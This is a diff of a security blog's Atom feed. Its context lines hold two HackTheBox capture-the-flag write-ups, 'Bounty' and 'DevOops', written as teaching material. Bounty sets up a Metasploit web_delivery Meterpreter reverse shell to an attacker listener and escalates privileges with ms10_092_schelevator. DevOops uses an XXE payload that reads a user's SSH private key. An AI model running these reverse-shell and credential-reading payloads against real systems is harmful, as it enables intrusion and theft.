@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-10-28T23:19:51+01:00</updated><id>http://localhost:4000/</id><title type="html">Computer Security for Beginners</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">HackTheBox: Bounty writeup - Metasploit basics</title><link href="http://localhost:4000/writeup/tutorial/web/2018/10/28/HackTheBox-Bounty.html" rel="alternate" type="text/html" title="HackTheBox: Bounty writeup - Metasploit basics" /><published>2018-10-28T22:00:00+01:00</published><updated>2018-10-28T22:00:00+01:00</updated><id>http://localhost:4000/writeup/tutorial/web/2018/10/28/HackTheBox-Bounty</id><content type="html" xml:base="http://localhost:4000/writeup/tutorial/web/2018/10/28/HackTheBox-Bounty.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-10-29T17:51:17+01:00</updated><id>http://localhost:4000/</id><title type="html">BoiteAKlou’s Infosec Blog</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">HackTheBox: Bounty writeup - Metasploit basics</title><link href="http://localhost:4000/writeup/tutorial/pentest/2018/10/28/HackTheBox-Bounty.html" rel="alternate" type="text/html" title="HackTheBox: Bounty writeup - Metasploit basics" /><published>2018-10-28T22:00:00+01:00</published><updated>2018-10-28T22:00:00+01:00</updated><id>http://localhost:4000/writeup/tutorial/pentest/2018/10/28/HackTheBox-Bounty</id><content type="html" xml:base="http://localhost:4000/writeup/tutorial/pentest/2018/10/28/HackTheBox-Bounty.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/bounty-box.png&quot; alt=&quot;Bounty box&quot; title=&quot;Bounty Box&quot; /&gt;&lt;/p&gt;
 
@@ -57,7 +57,7 @@ Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.039s latency&lt;span 
 Not shown: 999 filtered ports
 PORT   STATE SERVICE VERSION
 80/tcp open  http    Microsoft IIS httpd 7.5
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/7.5
 |_http-title: Bounty
@@ -90,7 +90,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 &lt;p&gt;The source code doesn’t reveal anything more… Hopefully gobuster will fly to our rescue!&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/Bounty&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;gobuster/bounty 
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/Bounty&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;gobuster/bounty
 /UploadedFiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 /uploadedFiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 /uploadedfiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
@@ -185,7 +185,7 @@ We can also juggle between several sessions, which can be pretty useful in some 
 
 &lt;p&gt;First, we have to run Metasploit console with &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt;. Then, we will use the &lt;strong&gt;web delivery script&lt;/strong&gt; exploit module. A module is loaded with the keyword &lt;em&gt;“use”&lt;/em&gt;, followed by the path of the module.&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/multi/script/web_delivery 
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/multi/script/web_delivery
 msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -224,16 +224,16 @@ Exploit target:
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SRVHOST 10.10.13.75  &lt;span class=&quot;c&quot;&gt;# Ip address of our machine&lt;/span&gt;
 SRVHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;TARGET 2  &lt;span class=&quot;c&quot;&gt;# TARGET 2 = powershell payload &lt;/span&gt;
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;TARGET 2  &lt;span class=&quot;c&quot;&gt;# TARGET 2 = powershell payload&lt;/span&gt;
 TARGET &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 2
 msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;PAYLOAD windows/x64/meterpreter/reverse_tcp  &lt;span class=&quot;c&quot;&gt;# The payload we want to inject, a reverse shell&lt;/span&gt;
 PAYLOAD &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/x64/meterpreter/reverse_tcp
 msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 10.10.13.75  &lt;span class=&quot;c&quot;&gt;# IP address for the reverse shell&lt;/span&gt;
 LHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit 
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exploit running as background job 0.
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.13.75:4444 
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.13.75:4444
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using URL: http://10.10.13.75:8080/moceswFJvKmkeD8
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Server started.
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Run the following &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;on the target machine:
@@ -311,7 +311,7 @@ Active sessions
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; sessions &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 1
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting interaction with 1...
 
-meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;From here, we can use a few shell commands (the full list can be displayed by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt;) or type &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; and dive into the classical Windows command prompt.&lt;/p&gt;
@@ -392,7 +392,7 @@ LHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.13.75:4445 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.13.75:4445
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Preparing payload at C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;EMP&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;IydYyMVXS.exe
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating task: sMVszFGn5xTj
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; has successfully been created.
@@ -402,7 +402,7 @@ LHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Final CRC32: 0xa1c992cd
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Writing our modified content back...
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Validating task: sMVszFGn5xTj
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Folder: &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; TaskName                                 Next Run Time          Status         
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;======================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===============&lt;/span&gt;
@@ -423,7 +423,7 @@ LHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; was successfully deleted.
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
 
-meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid&lt;/code&gt; command will confirm that the exploit worked:&lt;/p&gt;
@@ -447,7 +447,7 @@ c837f7b[...]f9d4f5ea
 &lt;p&gt;I hope it gave you a brief overview of the power of &lt;strong&gt;Metasploit Framework&lt;/strong&gt; and its ease of use. However, keep in mind that this tool will not help you to understand what is really happening on the machine.&lt;/p&gt;
 
 &lt;p&gt;Do not hesitate to ask your questions if something remains unclear for you :relaxed:.&lt;/p&gt;
-&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out. This machine was pretty easy so I’m going to take this opportunity to explain you the basics of the Metasploit framework.</summary></entry><entry><title type="html">HackTheBox: DevOops writeup</title><link href="http://localhost:4000/writeup/web/2018/10/10/HackTheBox-DevOops.html" rel="alternate" type="text/html" title="HackTheBox: DevOops writeup" /><published>2018-10-10T10:00:00+02:00</published><updated>2018-10-10T10:00:00+02:00</updated><id>http://localhost:4000/writeup/web/2018/10/10/HackTheBox-DevOops</id><content type="html" xml:base="http://localhost:4000/writeup/web/2018/10/10/HackTheBox-DevOops.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out. This machine was pretty easy so I’m going to take this opportunity to explain you the basics of the Metasploit framework.</summary></entry><entry><title type="html">HackTheBox: DevOops writeup</title><link href="http://localhost:4000/writeup/pentest/2018/10/10/HackTheBox-DevOops.html" rel="alternate" type="text/html" title="HackTheBox: DevOops writeup" /><published>2018-10-10T10:00:00+02:00</published><updated>2018-10-10T10:00:00+02:00</updated><id>http://localhost:4000/writeup/pentest/2018/10/10/HackTheBox-DevOops</id><content type="html" xml:base="http://localhost:4000/writeup/pentest/2018/10/10/HackTheBox-DevOops.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-10/devoops-box.png&quot; alt=&quot;DevOops box&quot; title=&quot;DevOops Box&quot; /&gt;&lt;/p&gt;
 
@@ -480,12 +480,12 @@ c837f7b[...]f9d4f5ea
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:/DevOops&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.10.10.91
     22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-    | ssh-hostkey: 
+    | ssh-hostkey:
     |   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
     |   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
     |_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
     5000/tcp open  http    Gunicorn 19.7.1
-    | http-methods: 
+    | http-methods:
     |_  Supported Methods: HEAD OPTIONS GET
     |_http-server-header: gunicorn/19.7.1
     |_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=utf-8).
@@ -527,7 +527,7 @@ GENERATED WORDS: 4612
 &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://10.10.10.91:5000/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
 + http://10.10.10.91:5000/feed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:546263&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                               
 + http://10.10.10.91:5000/upload &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:347&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                
-                                                                                                                                                    
+
 &lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
 END_TIME: Thu Oct 11 23:22:22 2018
 DOWNLOADED: 4612 - FOUND: 2
@@ -563,7 +563,7 @@ DOWNLOADED: 4612 - FOUND: 2
 &lt;p&gt;Here’s the payload I used:&lt;/p&gt;
 &lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--?xml version=&quot;1.0&quot; ?--&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [
-&amp;lt;!ELEMENT foo ANY&amp;gt;&lt;/span&gt; 
+&amp;lt;!ELEMENT foo ANY&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///home/roosa/.ssh/id_rsa&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;Book&amp;gt;&lt;/span&gt;
     &lt;span class=&quot;nt&quot;&gt;&amp;lt;Author&amp;gt;&lt;/span&gt;BoiteAKlou&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Author&amp;gt;&lt;/span&gt;
@@ -584,7 +584,7 @@ Welcome to Ubuntu 16.04.4 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/
 60 updates are security updates.
 
 Last login: Thu Oct 11 17:27:36 2018 from 10.10.12.226
-roosa@gitter:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
+roosa@gitter:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
 c5808e[..]ecc67b
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Now things are getting serious…&lt;/p&gt;
@@ -659,7 +659,7 @@ Permissions 0664 &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class
 It is required that your private key files are NOT accessible by others.
 This private key will be ignored.
 Load key &lt;span class=&quot;s2&quot;&gt;&quot;resources/integration/authcredentials.key&quot;&lt;/span&gt;: bad permissions
-root@localhost&lt;span class=&quot;s1&quot;&gt;'s password: 
+root@localhost&lt;span class=&quot;s1&quot;&gt;'s password:
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;SSH refuses to use this key because permissions are too open. We can fix this with &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 0600 resources/integration/authcredentials.key&lt;/code&gt; and try to connect again.&lt;/p&gt;
@@ -675,7 +675,7 @@ Welcome to Ubuntu 16.04.4 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/
 60 updates are security updates.
 
 Last login: Fri Oct 12 04:48:17 2018 from 10.10.13.23
-root@gitter:~# 
+root@gitter:~#
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Bingo! Enjoy the flag :wink:&lt;/p&gt;
